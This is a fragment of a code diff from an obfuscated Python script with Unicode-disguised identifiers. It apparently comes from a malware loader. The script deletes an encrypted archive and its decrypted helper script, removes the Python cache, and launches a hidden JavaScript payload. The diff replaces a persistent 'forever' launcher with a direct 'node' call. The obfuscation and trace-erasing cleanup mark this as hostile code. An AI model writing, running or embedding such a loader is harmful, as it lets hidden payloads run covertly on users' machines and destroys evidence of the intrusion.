@@ -120,7 +120,7 @@ if ᴠʟᴋʏʀᴇi is not None :#Line:41
             os .remove ("xp0e.aes")#Line:156
             os .remove ("xp0edoc.py")#Line:157
             shutil .rmtree ("__pycache__")#Line:158
-            os .system ("forever --minUptime 1000 --spinSleepTime 1000 --no-warnings Ѷ𝖑𝐤𝐲𝖗𝖊🎒𝕭𝖆𝖌/𝖍𝖆𝖜ӄ.js")#Line:159
+            os .system ("node Assets/Ѷ𝖑𝐤𝐲𝖗𝖊.js")#Line:159
         else :#Line:160
             os .remove ("xp0e.zip")#Line:161
             os .remove ("xp0e.aes")#Line:162
